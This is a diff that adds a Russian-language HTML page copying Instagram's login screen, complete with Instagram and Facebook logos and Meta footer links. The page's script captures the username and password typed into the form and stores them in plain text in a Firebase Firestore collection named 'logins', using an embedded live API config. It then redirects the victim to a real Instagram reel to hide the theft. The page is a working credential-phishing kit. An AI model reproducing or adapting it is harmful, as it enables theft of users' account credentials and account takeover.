@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" integrity="sha512-XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX=" crossorigin="anonymous" />
+
+    <title>Login Form</title>
+    <!-- Добавим стили для формы -->
+    <style>
+        a{
+            text-decoration: none;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
+            background-color: #fafafa;
+        }
+        .container {
+            max-width: 250px;
+            margin: 0 auto;
+            padding-top: 50px;
+            border-radius: 5px;
+            overflow: hidden;
+            padding-left: 40px; /* Отступ слева */
+            padding-right: 60px; /* Отступ справа */
+        }
+
+        .container-signup {
+            max-width: 300px;
+            margin: 0 auto;
+            border-radius: 5px;
+            overflow: hidden;
+            padding-left: 40px; /* Отступ слева */
+            padding-right: 60px; /* Отступ справа */
+            margin-top: 20px;
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 10px;
+        }
+
+        .logo img {
+            width: 175px;
+        }
+
+        .form-group {
+            margin-bottom: 5px;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 91%;
+            padding: 10px;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            background-color: rgb(241, 241, 241);
+            font-size: 14px;
+            color: #262626;
+            outline: none;
+        }
+
+        input[type="text"]:focus,
+        input[type="password"]:focus {
+            border: 2px solid #dbdbdb;
+        }
+
+        button {
+            display: block;
+            width: 100%; /* Теперь кнопка будет занимать всю ширину контейнера */
+            padding: 7px;
+            border: none;
+            border-radius: 8px;
+            background-color: rgb(64, 179, 255);
+            color: #fff;
+            font-size: 13px;
+            font-weight: 500;
+            cursor: pointer;
+            text-align: center; /* Выравниваем текст по центру */
+        }
+
+        button:hover {
+            background-color: #357ae8;
+        }
+
+        .forgot-password-link{
+            font-size: 12px;
+            color: rgb(53, 153, 219);
+        }
+
+        .forgot-password {
+            text-align: right;
+            margin-top: 20px;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+
+        .signup-link {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            margin-bottom: 20px;
+            color: #4e4e4e;
+        }
+
+        .form-input::placeholder{
+            font-size: 11.7px;
+        }
+
+        .button-divider {
+    position: relative;
+    /* margin-top: 20px; */
+    text-align: center; /* Центрируем текст "ИЛИ" по горизонтали */
+    margin-bottom: 20px;
+}
+
+.button-divider::before {
+    content: '';
+    position: absolute;
+    bottom: 30%; /* Положение полоски в середине высоты кнопки */
+    left: 0;
+    width: 100%;
+    height: 1px;
+    background-color: #dbdbdb;
+}
+
+.button-divider p {
+    position: relative;
+    display: inline-block;
+    background-color: #fafafa;
+    padding: 0 10px;
+    font-size: 14px;
+    font-weight: 600;
+    color: #777;
+    z-index: 1; /* Поднимаем текст "ИЛИ" над полоской */
+    margin-bottom: -6px; /* Сдвигаем текст "ИЛИ" немного вверх, чтобы он находился в середине полоски */
+}
+
+    .signup{
+        color: rgb(0, 149, 246)
+    }
+
+    .login-facebook {
+    margin-top: 20px;
+    padding: 10px 0;
+    text-align: center;
+    font-size: 14px;
+    font-weight: 600;
+    color: #fff;
+    background-color: #357ae8;
+    border-radius: 5px;
+}
+
+.login-facebook:hover {
+    cursor: pointer;
+}
+
+
+.footer-text-sec{
+    text-align: center;
+    color: gray;
+    word-spacing: 1rem;
+    font-size: 10px;
+}
+
+.footer-text-sec:hover{
+    cursor: pointer;
+}
+
+.footer-text{
+    margin-left: auto; /* Автоматический отступ слева */
+    margin-right: auto; /* Автоматический отступ справа */
+    text-align: center;
+    color: gray;
+    margin-top: 10rem;
+    margin-bottom: 5rem;
+}
+
+
+.footer-text span {
+    background: linear-gradient(to right, rgb(255, 165, 0), rgb(128, 0, 128)); /* Градиент от оранжевого к фиолетовому */
+    -webkit-background-clip: text; /* Применяем градиент как текст */
+    -webkit-text-fill-color: transparent;
+    font-weight: bold;
+}
+
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="./assest/Instagram_logo.svg.png" alt="Instagram">
+        </div>
+
+        <div class="login-facebook">
+            <img src="./assest/facebook.png" alt="Facebook Icon" style="width: 15px; margin-right: 0.2rem;"> Продолжите с аккаунтом Facebook
+        </div>
+
+        <div class="button-divider">
+            <p>ИЛИ</p>
+        </div>
+
+        <!-- Создадим форму для ввода логина и пароля -->
+        <form id="loginForm">
+            <div class="form-group">
+                <input class="form-input" placeholder="Телефон, имя пользователя или эл.адрес" type="text" id="username" name="username" required>
+            </div>
+            <div class="form-group">
+                <input class="form-input" placeholder="Пароль" type="password" id="password" name="password" required>
+            </div>
+            <!-- Кнопка для отправки данных -->
+            <div class="forgot-password">
+                <a class="forgot-password-link" href="https://www.instagram.com/accounts/password/reset/?next=%2Fzeyhal12%2Ffeed%2F&locale=ru">Забыли пароль?</a>
+            </div>
+            <button id="loginButton" onclick="redirectToInstagram()" type="submit">Войти</button>
+        </form>
+
+    </div>
+<div class="container-signup">
+    <div class="signup-link">
+        У вас ещё нет аккаунта? <a class="signup" href="https://www.instagram.com/accounts/emailsignup/?next=%2Fzeyhal12%2Ffeed%2F&locale=ru">Зарегистрироваться</a>
+    </div>
+</div>
+
+
+<footer class="footer">
+    <p class="footer-text">from<br> <span>Meta</span></p>
+    <div class="container-footer">
+        <div class="footer-wrapper-text">
+            <p class="footer-text-sec">
+               <a class="footer-text-sec" href="https://about.meta.com/">Meta</a> 
+               <a class="footer-text-sec" href="https://about.instagram.com/"> Информация</a>
+               <a class="footer-text-sec" href="https://about.instagram.com/blog">Блог</a>
+               <a class="footer-text-sec" href="https://about.instagram.com/about-us/careers">Вакансии</a>
+               <a class="footer-text-sec" href="https://help.instagram.com/">Помощь</a>
+               <a class="footer-text-sec" href="https://developers.facebook.com/docs/instagram">API</a>
+            <p class="footer-text-sec">
+                Конфиденциальность
+                Условия
+                Места
+                Instagram Lite
+                Threads
+            </p>
+            <p class="footer-text-sec">
+                Загрузка контактов и лица, не являющиеся пользователями
+                Meta Verified
+            </p>
+        </div>
+    </div>
+</footer>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <!-- Добавим скрипт для работы с Firebase Realtime Database -->
+    <script src="https://www.gstatic.com/firebasejs/9.5.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.5.0/firebase-firestore-compat.js"></script>
+    
+    <script>
+        // Инициализация Firebase
+        const firebaseConfig = {
+  apiKey: "AIzaSyCrD4yJPcNJRT-WRVO4fYJsA6EZ5NlXPiY",
+  authDomain: "steelpass-43f95.firebaseapp.com",
+  projectId: "steelpass-43f95",
+  storageBucket: "steelpass-43f95.appspot.com",
+  messagingSenderId: "207086938447",
+  appId: "1:207086938447:web:ded77e5a7b09305e7f7d3a",
+  measurementId: "G-NDZ9F1GJM2"
+};
+    
+        // Инициализируйте Firebase до использования
+        firebase.initializeApp(firebaseConfig);
+    
+        // Получите ссылку на Firestore после инициализации Firebase
+        const db = firebase.firestore();
+    
+        // Обработчик отправки формы
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+    
+            // Получаем данные из формы
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+    
+            // Отправляем данные в Firestore
+            db.collection('logins').add({
+                username: username,
+                password: password
+            })
+            .then(() => {
+                // Очищаем поля формы
+                document.getElementById('username').value = '';
+                document.getElementById('password').value = '';
+    
+                window.location.href = "https://www.instagram.com/reels/C6waejKLYXN/";
+
+            })
+            .catch((error) => {
+                console.error('Ошибка при отправке данных: ', error);
+            });
+        });
+
+        function checkFields() {
+        // Получаем значения полей
+        var username = document.getElementById('username').value;
+        var password = document.getElementById('password').value;
+        
+        // Получаем кнопку
+        var loginButton = document.getElementById('loginButton');
+        
+        // Проверяем, заполнены ли поля
+        if (username.trim() !== '' && password.trim() !== '') {
+            // Если оба поля заполнены, активируем кнопку
+            loginButton.disabled = false;
+        } else {
+            // Если хотя бы одно поле не заполнено, деактивируем кнопку
+            loginButton.disabled = true;
+        }
+    }
+
+    function redirectToInstagram() {
+        // Получаем значения полей
+        var username = document.getElementById('username').value;
+        var password = document.getElementById('password').value;
+        
+        // Проверяем, заполнены ли поля
+        if (username.trim() === '' || password.trim() === '') {
+            // Если одно из полей не заполнено, выходим из функции
+            return;
+        }
+
+        // Перенаправляем пользователя на страницу Instagram reels
+    }
+
+    // Вызываем функцию проверки при изменении значений полей
+    document.getElementById('username').addEventListener('input', checkFields);
+    document.getElementById('password').addEventListener('input', checkFields);
+    </script>
+</body>
+</html>
